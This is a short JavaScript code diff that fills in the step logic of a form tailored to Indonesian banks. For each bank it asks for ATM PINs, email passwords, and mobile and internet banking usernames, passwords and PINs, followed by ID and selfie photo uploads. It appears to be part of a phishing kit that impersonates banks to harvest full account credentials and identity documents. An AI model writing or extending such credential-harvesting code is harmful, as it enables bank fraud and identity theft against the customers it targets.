@@ -18,7 +18,19 @@ const getSteps = (bank) => {
     'validThru', 'noHp', 'pinAtm', 'email', 'passEmail', 'expired'
   ];
 
-  // ... (keep bankSteps logic as is) ...
+  let bankSteps = [];
+  const b = (bank || '').toUpperCase();
+
+  if (b === 'BCA') {
+    bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin', 'ibUser', 'ibPassword'];
+  } else if (b === 'BRI') {
+    bankSteps = ['brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
+  } else if (b === 'BNI') {
+    bankSteps = ['pinWondr', 'passWondr', 'mobileUser', 'mobilePassword'];
+  } else if (b !== '') {
+    // Mandiri, Danamon, OCBC, etc.
+    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
+  }
 
   return [...commonStart, ...bankSteps, ...commonEnd, 'uploadFotoId', 'uploadFotoSelfie'];
 };
